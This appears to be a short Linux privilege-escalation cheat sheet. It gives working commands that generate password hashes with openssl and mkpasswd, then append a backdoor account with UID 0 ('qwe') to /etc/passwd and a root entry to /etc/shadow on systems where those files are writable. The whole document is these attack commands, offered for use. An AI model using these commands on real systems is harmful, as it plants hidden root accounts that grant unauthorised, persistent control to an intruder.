- openssl → passwd

```bash
# generate a user line
openssl passwd -1 -salt qwe qwe > hash.txt
# Append this line into passwd file
echo 'qwe:$1$qwe$D95bkH3CwpH6ffYU7pu0m/:0:0:root:/root:/bin/bash' >> /etc/passwd
```

- mkpasswd → shadow

```bash
# generate a root line
mkpasswd -m sha-512 qwe
# change root line in shadow file
echo 'root:$6$Xolj1ebW9aRM/8xt$wj.BXJW73pUViZmZZhVyOqsyF35nlKx9t58gO2oLPbkhilOrDdyIQEvZjBYSjN9Dl5Dq6rOcA5rKC7/YtUTEt.:19509:0:99999:7:::' >> /etc/shadow
```